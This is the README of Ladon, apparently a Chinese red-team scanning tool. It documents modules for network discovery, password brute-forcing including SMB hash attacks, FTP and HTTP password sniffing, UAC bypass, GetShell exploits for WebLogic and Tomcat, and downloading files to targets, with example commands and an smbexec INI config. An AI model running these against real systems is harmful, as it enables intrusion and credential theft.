## Ladon 6.3 20200415
![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)

[![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
[![Ladon](https://img.shields.io/badge/Ladon-6.3-yellowgreen)](https://github.com/k8gege/Ladon) 
[![Bin](https://img.shields.io/badge/Ladon-Bin-ff69b4)](https://github.com/k8gege/Ladon/releases) 
[![GitHub issues](https://img.shields.io/github/issues/k8gege/Ladon)](https://github.com/k8gege/Ladon/issues) 
[![Github Stars](https://img.shields.io/github/stars/k8gege/Ladon)](https://github.com/k8gege/Ladon) 
[![GitHub forks](https://img.shields.io/github/forks/k8gege/Ladon)](https://github.com/k8gege/Ladon)
[![GitHub license](https://img.shields.io/github/license/k8gege/Ladon)](https://github.com/k8gege/Ladon)



### Ladon for Windows
<img src=https://k8gege.org/k8img/Ladon/Ladon.gif></img>
### Ladon GUI
<img src=https://k8gege.org/k8img/Ladon/LadonGUI.gif></img>
### Ladon for Cobalt Strike
<img src=https://k8gege.org/k8img/Ladon/CS_Ladon.gif></img>
### Ladon for PowerShell
<img src=https://k8gege.org/k8img/Ladon/PowerLadon.gif></img>
### Python Ladon
<img src=https://k8gege.org/k8img/Ladon//py/PyLadon.PNG></img>
### Ladon for Linux
<img src=https://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif></img>

### 使用说明

ID | 主题 |  URL 
-|-|-
1 | Ladon最新文档 | http://k8gege.org/p/648af4b3.html
2 | 基础用法详解 | https://github.com/k8gege/Ladon/wiki/Ladon-Usage
3 | Cobalt Strike | https://github.com/k8gege/Aggressor
4 | Exp生成器使用 | https://github.com/k8gege/Ladon/wiki/LadonExp-Usage
5 | 高度自定义插件 | https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle
6 | 外部模块参考 | https://github.com/k8gege/K8CScan/wiki
7 | PowerShell| https://github.com/k8gege/powerladon
8 | Python Ladon | https://github.com/k8gege/PyLadon
9 | Kali Ladon | https://github.com/k8gege/KaliLadon
10 | 漏洞演示视频 | https://github.com/k8gege/K8CScan/tree/master/Video
11 | Ladon6.0文档 | https://k8gege.org/p/56393.html
12 | Ladon6.2文档 | http://k8gege.org/p/39070.html

### 源码编译

git clone https://github.com/k8gege/Ladon.git
使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE

### 源码编译

git clone https://github.com/k8gege/Ladon.git<br>
使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE<br>

### 成品下载
https://github.com/k8gege/Ladon/releases<br>
Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br>
Win8-win10或安装.net 4.x系统可使用Ladon40.exe<br>

### 前言
<br>
无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>
但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>
漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>
对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>
因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。<br>


### 关于Ladon

Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br>
Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br>
杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br>
为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br>
可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。<br>

### 程序简介

Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。6.2版本内置58个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br>

### 使用简单
<br>
虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>
只需一或两个参数就可用90%的功能,一个模块相当于一个新工具<br>
<br>
### 运行环境
#### Windows

Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br>
如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>
Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透<br>
<br>
#### Linux、Mac

安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。

```Bash
apt install mono-runtime<br>
wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon<br>
mono Ladon 192.168.1.8/24 OnlinePC<br>
```

由于mono的兼容性，不保证Mac或Linux下所有功能均可用<br>
就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>
测试发现有些功能的稳定性以及速度没有Windows系统快<br>
未列功能系未测试或暂不可用功能，使用前请先看说明<br>

实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试<br>


### 奇葩条件

实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标<br>
有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了<br>
Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧<br>
还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的<br>

### 宗旨
<br>
为用户提供一个简单易用、功能丰富、高度灵活、可定制的扫描工具，减少大量重复操作提高工作效率<br>

### 特色
<br>
扫描流量小<br>
程序体积小<br>
功能丰富强大<br>
程序简单易用<br>
插件支持多种语言<br>
跨平台(Win/Kali/Ubuntu)等<br>
支持Cobalt Strike插件化<br>
支持PowerShell无文件渗透<br>
Exp生成器可一键定制Poc<br>
多版本适用各种环境<br>

### 程序参数功能
<br>
1  支持指定IP扫描<br>
2  支持指定域名扫描<br>
3  支持指定机器名扫描<br>
4  支持指定C段扫描(ip/24)<br>
5  支持指定B段扫描(ip/16)<br>
6  支持指定A段扫描(ip/8)<br>
7  支持指定URL扫描<br>
8  支持批量IP扫描(ip.txt)<br>
9  支持批量C段扫描(ip24.txt)<br>
10 支持批量B段扫描(ip16.txt)<br>
11 支持批量URL扫描(url.txt)<br>
12 支持批量域名扫描(domain.txt)<br>
13 支持批量机器名扫描(host.txt)<br>
14 支持批量字符串列表(str.txt)<br>
15 支持主机帐密列表(check.txt)<br>
16 支持用户密码列表(userpass.txt)<br>
17 支持指定范围C段扫描<br>
18 支持参数加载自定义DLL（仅限C#）<br>
19 支持参数加载自定义EXE（仅限C#）<br>
20 支持参数加载自定义INI配置文件<br>
21 支持参数加载自定义PowerShell<br>
22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>
23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>
24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>
25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br>
26 INI配置支持自定义程序密码爆破<br>
<br>
### 内置功能模块(58)

#### 0x001 资产扫描(10)

例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br>
例子: Ladon 192.168.1.8/24 OnlinePC<br>

ID | 模块名称 |  功能说明  | 返回结果
-|-|-|-
1 | [OnlinePC](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F) | 存活主机扫描 | 存活IP、Mac地址、机器名、设备制造商
2 | [OnlineIP](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F) | 仅存活主机IP | 存活IP
3 | [UrlScan](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E5%9F%9F%E5%90%8DURL%E6%89%AB%E6%8F%8F)  | URL域名扫描 | 同服URL（不验证IP、域名、Web标题）
4 | [SameWeb](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E6%97%81%E7%AB%99%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F)  | 同服域名扫描 | 同服URL（验证IP、域名、Web标题）
5 | [WebScan](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F)  | Web信息扫描 | 存活IP、主机名、Banner、Web标题
6 | [WebDir](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F)  | 后台目录扫描 | 地址、HTTP状态
7 | [SubDomain](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4)  | 子域名爆破 | 子域名 (可用DomainIP/HostIP解析)
8 | [DomainIP](https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90)  | 域名解析IP | 域名、IP
9 | [HostIP](https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%A7%A3%E6%9E%90)  | 主机名转IP | IP、域名
10 | [AdiDnsDump](http://k8gege.org/p/39070.html)  | 域内机器信息获取(非域内请使用LdapScan探测) | IP、域名


#### 0x002 指纹识别/服务识别(8)
<br>
例子: Ladon OsScan<br>
例子: Ladon 192.168.1.8/24 OsScan<br>
<br>
ID | 模块名称 |  功能说明  | 返回结果
-|-|-|-
1 | [OsScan](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B)  |  操作系统版本探测 | 存活IP、工作组\机器名、操作系统、
2 | [PortScan](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB))  | 端口扫描含Banner | 主机名、开放端口、服务识别、Banner、Web标题<br>
3 | [WhatCMS](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB)  |  75种Web指纹识别 | URL、CMS、邮件系统、登陆页面、中间件(如Apache\Tomecat\IIS)等
4 | [CiscoScan](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F)  | 思科设备扫描 | 存活IP、设备型号、主机名、Boot、硬件版本
5 | [EnumMssql](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E5%86%85%E7%BD%91MSSQL%E4%B8%BB%E6%9C%BA)  | 枚举Mssql数据库主机 | 数据库IP、机器名、SQL版本
6 | [EnumShare](https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90)  | 枚举网络共享资源 | 域、存活IP、共享路径
7 | [LdapScan](http://k8gege.org/p/39070.html)  | 不指定密码时，仅探测LDAP服务器 | IP是否LDAP服务器
8 | [FtpScan](http://k8gege.org/p/39070.html)  | 不指定密码时，仅探测FTP服务器 | IP是否FTP服务器


#### 0x003 口令检测/密码爆破(16)
[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]<br>
<br>
例子: Ladon SshScan<br>
例子: Ladon 192.168.1.8/24 SshScan<br>
例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br>
例子: Ladon test.rar RarScan<br>
<br>
ID | 模块名称 |  功能说明  | 返回结果 | 依赖
-|-|-|-|-<br>
1 | [SmbScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-SmbScan(Windows))  |  SMB密码爆破(Windows) | 检测过程、成功密码、LOG文件 |
2 | [WmiScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-WmiScan(Windows))  |  Wmi密码爆破(Windowns) | 检测过程、成功密码、LOG文件 | 
3 | [IpcScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%B4%E7%88%86%E7%A0%B4-IpcScan(Windows))  |  Ipc密码爆破(Windows) | 检测过程、成功密码、LOG文件 | 
4 | [LdapScan](http://k8gege.org/p/56393.html)  |  AD域密码爆破(Windows) | 检测过程、成功密码、LOG文件 | 
5 | [SmbHashScan](http://k8gege.org/p/39070.html)  |  SMB HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 | 
6 | [WmiHashScan](http://k8gege.org/p/39070.html)  |  WMI HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 | 
7 | [SshScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-SSHscan(Linux))  |  SSH密码爆破(Linux) | 检测过程、成功密码、LOG文件 | Renci.SshNet.dll
8 | [MssqlScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93)  | Mssql数据库密码爆破 | 检测过程、成功密码、LOG文件 | 
9 | [OracleScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Oracle%E6%95%B0%E6%8D%AE%E5%BA%93)  | Oracle数据库密码爆破 | 检测过程、成功密码、LOG文件 | DDTek.Oracle.dll
10 | [MysqlScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)  | Mysql数据库密码爆破 | 检测过程、成功密码、LOG文件  | MySql.Data.dll
11 | [WeblogicScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Weblogic%E5%AF%86%E7%A0%81%E6%A3%80%E6%B5%8B) | Weblogic后台密码爆破 | 检测过程、成功密码、LOG文件 | 
12 | [VncScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-VNC%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2)  |  VNC远程桌面密码爆破 | 检测过程、成功密码、LOG文件  | VncSharp.dll
13 | [FtpScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-FTP%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8)  |  Ftp服务器密码爆破 | 检测过程、成功密码、LOG文件 | 
14 | [RarScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Rar%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3)  |  Rar压缩包密码爆破 | 检测过程、成功密码、LOG文件  | Rar.exe
15 | [TomcatScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-TomcatScan%E6%A8%A1%E5%9D%97Tomcat%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B)  |  Tomcat后台登陆密码爆破 | 检测过程、成功密码、LOG文件<br>
16 | [HttpBasicScan](https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-HttpBasicScan%E6%A8%A1%E5%9D%97phpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B)  | HttpBasic401认证密码爆破 | 检测过程、成功密码、LOG文件

#### 0x004 漏洞检测/漏洞利用(8)
<br>
例子: Ladon MS17010<br>
例子: Ladon 192.168.1.8/24 MS17010<br>
例子: Ladon http://192.168.1.8 WeblogicExp<br>
<br>
ID | 模块名称 |  功能说明  <br>
-|-|-<br>
1 | [MS17010](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-MS17010%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B)   | SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)
2 | [WeblogicPoc](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit) | Weblogic漏洞检测(CVE-2019-2725/[CVE-2018-2894](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894))
3 | [PhpStudyPoc](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B) |  PhpStudy后门检测(phpstudy 2016/phpstudy 2018)
4 | [ActivemqPoc](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F--CVE-2016-3088) |  ActiveMQ漏洞检测(CVE-2016-3088) 
5 | [TomcatPoc](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2017-12615)  | Tomcat漏洞检测(CVE-2017-12615)
6 | [WeblogicExp](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit) | Weblogic漏洞利用(CVE-2019-2725)
7 | [TomcatExp](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2017-12615)  | Tomcat漏洞利用(CVE-2017-12615)
8 | [Struts2Poc](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-Struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B) | Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)

#### 0x005 加密解密(4)
例子: Ladon 字符串 EnHex<br>
例子: Ladon EnHex (批量str.txt)<br>
<br>
ID | 模块名称 |  功能说明  <br>
-|-|-
1 | [EnHex](https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81) |  批量Hex密码加密
2 | [DeHex](https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81)  |  批量Hex密码解密
3 | [EnBase64](https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81) |  批量Base64密码加密
4 | [DeBase64](https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81)  | 批量Base64密码解密

#### 0x006 下载功能(2)
下载功能主要用于内网文件传输或者将VPS文件下载至目标机器<br>

ID | 模块名称 |  功能说明 | 用法
-|-|-|-
1 | HttpDownLoad | HTTP下载 | Ladon HttpDownLoad http://k8gege.org/test.exe
2 | FtpDownLoad | Ftp下载 | Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe

#### 0x007 网络嗅探(3)
基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>
主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>
后续可能会添加其它功能可能另外写个专门用于嗅探的工具<br>
PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>
重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>
当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)<br>

ID | 模块名称 |  功能说明 | 用法
-|-|-|-
1 | FtpSniffer/SnifferFtp | Ftp密码嗅探 | Ladon FtpSniffer 192.168.1.5
2 | HttpSniffer/SnifferHTTP  | HTTP密码嗅探 | Ladon HTTPSniffer 192.168.1.5
3 | Sniffer  | 网络嗅探(源地址、目标地址) | Ladon Sniffer
<br>
#### 0x008 密码读取(1)
<br>
ID | 模块名称 |  功能说明 | 用法
-|-|-|-
1 | EnumIIS/IisWeb  | IIS站点密码读取 | Ladon EnumIIS 或 Ladon IisWeb

#### 0x009 信息收集(3)
<br>
ID | 模块名称 |  功能说明 | 用法
-|-|-|-
1 | EnumProcess/ProcessList/tasklist | 进程详细信息 | Ladon EnumProcess 或 Ladon Tasklist
2 | GetCmdLine/CmdLine | 获取命令行参数 | Ladon cmdline 或 Ladon cmdline cmd.exe
3 | GetInfo/GetInfo2 | 获取渗透基础信息 | Ladon GetInfo 或 Ladon GetInfo2
<br>
#### 0x010 其它功能(3)
<br>
ID | 模块名称 |  功能说明 | 用法
-|-|-|-
1 | [BypassUac](http://k8gege.org/p/39070.html)   | 绕过UAC执行,支持Win7-Win10 | Ladon BypassUac c:\1.exe 或 Ladon BypassUac c:\1.bat
2 | [EnableDotNet](http://k8gege.org/p/39070.html)   | 一键启用.net 3.5(2008系统默认未启用) | Ladon EnableDotNet
3 | [gethtml](http://k8gege.org/p/39070.html)   | 获取内网站点HTML源码 | Ladon gethtml http://192.168.1.1
<br>
注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br>
 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br>
 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。<br>

### 外部插件模块(10)
<br>
ID | 功能 | 实现语言 | 功能说明 
-|-|-|-
1 | 漏洞扫描 | C语言 | [CVE 2019-0708 Windows Rdp 3389漏洞批量检测](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)
2 | 漏洞利用 | Exp生成器 |[ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit)
3 | 漏洞利用 | Python | [CVE-2019-9621 Zimbra GetShell Exploit](https://github.com/k8gege/ZimbraExploit)
4 | 漏洞利用 | Python | [CVE-2019-0604 SharePoint GetShell Exploit](https://github.com/k8gege/CVE-2019-0604)
5 | 漏洞利用 | Exp生成器 | [CVE 2016-3088 ActiveMQ GetShell Exploit](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit)
6 | 漏洞利用 | Python | [Apache Solr 8.2.0 Velocity RCE 0day Exploit](https://github.com/k8gege/SolrExp)
7 | 漏洞利用 | Exp生成器 | [PhpStudy后门 GetShell Exploit](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8)
8 | 命令执行 | INI配置 | [INI调用外部程序命令批量Linux上控](https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7)
9 | 命令执行 | INI配置 | [INI调用外部程序命令批量Windowns上控](https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7)
10 | 漏洞扫描 | Python | [PHP-FPM 远程代码执行漏洞(CVE-2019-11043)](https://github.com/k8gege/CVE-2019-11043)
11 | 漏洞扫描 | Exp生成器 |[Weblogic CVE-2018-2894漏洞检测](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894)
12 | 漏洞利用 | PowerShell | [MS17010EXP 永恒之蓝漏洞利用](https://github.com/k8gege/MS17010EXP)
13 | 脚本调用 | PowerShell | [Kali 2019无PowerShell执行脚本](http://k8gege.org/p/32e1a912.html)
<br>

文档参考Cscan: https://github.com/k8gege/K8CScan/wiki<br>

## 中级用法
<br>
### 批量扫描
0x001 参数 ip/24 ip/16 ip/8<br>
命令: Ladon 192.168.1.8/24 OnlinePC<br>
<br>
0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br>
程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br>
无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC<br>
<br>
### 禁ping扫描
默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>
或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br>
Ladon noping<br>
Ladon noping 192.168.1.8/24<br>
Ladon noping 192.168.1.8/24 MS17010<br>
<br>
### Socks5代理扫描
<br>
Windows下暂未发现比较好的支持.NET程序的代理工具，所以使用Kali版<br>
proxychains mono Ladon noping 192.168.1.8/24 MS17010<br>
proxychains mono Ladon noping http://192.168.1.1 WhatCMS<br>

### 配置INI调用任意程序、密码爆破
<br>
适用场景，需调用相关命令或第三方工具进行批量操作<br>
或者有新的POC，但来不及或无法写成DLL来调用时<br>
很多第3方工具不支持批量或者说根本不支持批量网段<br>
而Ladon不只限于批量IP、URL、IP段、任意内容等<br>
是紧急情况下最适合用于验证内网是否存在漏洞工具<br>
新的漏洞来时你能调好POC就不错了，批量更要时间<br>

#### 调用系统ping命令进行存活主机探测
ping.ini<br>
[Ladon]<br>
exe=cmd.exe<br>
arg=/c ping $ip$<br>
<br>
命令:  Ladon ping.ini<br>
命令:  Ladon 192.168.1.8/24 ping.ini<br>
<br>
#### 调用Python poc批量检测漏洞
[Ladon]<br>
exe=F:\Python279\python.exe<br>
arg=CVE-2019-11043-POC.py $ip$<br>
<br>
例子: https://github.com/k8gege/CVE-2019-11043<br>
<br>
#### 自定义程序密码爆破
<br>
例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>
根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。<br>
<br>
smbhash.ini<br>
[Ladon]<br>
exe=smbexec.exe<br>
arg=-hashes $pass$ $user$@$ip$<br>
isok=Launching semi-interactive shell<br>
port=445<br>
log=true<br>
<br>
INI参数说明<br>
isok：成功标志，必填项。如smbexec成功时返回"Launching semi-interactive shell"<br>
port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>
log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示<br>
<br>
检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>
详见：http://localhost:4000/p/53177.html<br>
<br>
### 配置端口扫描参数
使用PortScan模块时，默认扫描常见高危漏洞端口<br>
遇到修改了默认端口的，Ladon就无法扫描了吗？<br>
使用port.txt<br>
格式1:80,21,1433,3306,445<br>
格式2:80-88,21-23,5800-5900<br>
格式3:<br>
21<br>
23<br>
80<br>
格式4:<br>
80-88<br>
21-23<br>
<br>
### 配置密码爆破参数
1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>
2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>
